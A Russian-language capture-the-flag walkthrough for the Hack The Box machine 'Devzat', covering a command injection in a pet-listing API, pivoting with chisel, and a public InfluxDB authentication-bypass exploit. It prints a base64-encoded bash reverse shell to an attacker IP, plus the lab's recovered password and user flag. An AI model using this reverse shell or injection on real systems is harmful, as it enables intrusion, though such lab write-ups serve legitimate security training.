# Devzat (Medium)

![](imgs/Devzat/htb.png)

Сначала найдем открытытые порты. Просканируем данный ip с помощью nmap.

![](imgs/Devzat/nmap.png)

Просмотрим порт 80 - HTTP. Главная страница сайта - чата для разработчиков.

![](imgs/Devzat/main_page1.png)

Видим, что есть 2 ветки гита, 10 клиентов, ... Также предложение подключиться по ssh.

![](imgs/Devzat/main_page2.png)

email patrick@devzat.htb. Ссылки на социалки не работают.

![](imgs/Devzat/main_page3.png)

Здесь мы больше ничего не может найти. Попытаемся найти поддомены с помощью gobuster.
Словарь взят из: 
https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-110000.txt

![](imgs/Devzat/gobuster.png)

Спустя некоторое время нашелся первый поддомен - pets.devzat.htb

![](imgs/Devzat/pets_page.png)

Видим таблицу записей о питомцах. Внизу страницы есть поле ввода.

![](imgs/Devzat/pets_page2.png)

В записи exit status 1 вместо species.

![](imgs/Devzat/pets_page3.png)

Удаление записей не работает.

![](imgs/Devzat/pets_page4.png)

Больше ничего не нашли. Проверим pets на директории с gobuster.

![](imgs/Devzat/pets_git.png)

Нашлась директория .git. Скачаем ее с помощью wget -r. Там только один файл - robot.txt

![](imgs/Devzat/robots.png)

Проверим git status. Видим, что удалены все файлы. Попробуем восстановить.

![](imgs/Devzat/git_status.png)

Введем git checkout --., чтобы вернуться к предыдущему коммиту. Получаем набор файлов

![](imgs/Devzat/git_reversed.png)

в файле main.go находится код всех функций на сайте (добавление, удаление записи в таблице, само содержимое таблицы и пр.)

![](imgs/Devzat/main_go.png)

Однако замечаем интересную функцию load_character. Здесь вызывается команда (shell скрипт), в которую конкатенируется параметр species.

![](imgs/Devzat/load_char.png)

Эта функция вызывается при добавлении питомца. species - пользовательский ввод.

![](imgs/Devzat/add_pet.png)

Нужный нам раут - POST /api/pet

![](imgs/Devzat/api_routes.png)

Попробуем ввести скрипт при добавлении нового питомца.

![](imgs/Devzat/curl.png)

![](imgs/Devzat/curl2.png)

Воспользуемся реверс шелом

![](imgs/Devzat/bash_encode.png)

    YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43NS8xMzM3IDA+JjE=

![](imgs/Devzat/curl3.png)

Просмотрим директории

![](imgs/Devzat/directories.png)

Из интересного только .ssh. Получили приватный ключ патрика

![](imgs/Devzat/private_key.png)

Подключились с ним по ssh

![](imgs/Devzat/ssh.png)

Попытаемся найти user.txt файлы. Видим что он есть в папке catherine. Однако не хватает прав.

![](imgs/Devzat/user_txt.png)

Просмотрим активные подключения с помощью netstat.

![](imgs/Devzat/internet_connections.png)

Просмотрим процессы на этих портах. Видим на 8086 докер

![](imgs/Devzat/ps_ax.png)

Однако он работает на локалхосте и у нас нет к нему доступа. Воспользуемся chisel, чтобы прокинуть себе этот порт.

Качаем патрику chisel

![](imgs/Devzat/chisel_install.png)

Запускаем у себя chisel сервер

![](imgs/Devzat/chisel_server.png)

Подключаем патрика

![](imgs/Devzat/chisel_client.png)

После того. как перекинули себе 8086 порт, сканируем его nmap

![](imgs/Devzat/nmap2.png)

Видим, что тут запущен какой-то сервис InfluxDB. Для него существует эксплойт https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933

    authentication bypass vulnerability in the authenticate function in services/httpd/handler.go because a JWT token may have an empty SharedSecret (aka shared secret).

![](imgs/Devzat/admin.png)

В InfluxDB есть команда для просмотра таблиц.

    SHOW MEASUREMENTS

![](imgs/Devzat/show_measurements.png)

Видим таблицу "user". Посмотрим на нее

![](imgs/Devzat/select_all.png)

Видим catherine, у которой есть user.txt. Сохраним пароль       

    woBeeYareedahc7Oogeephies7Aiseci

Теперь можно зайти как catherine и прочитать user.txt

![](imgs/Devzat/user_txt2.png)

    6e7e6e8326e9d310f7d725d2bb780d9e

![](imgs/Devzat/htb2.png)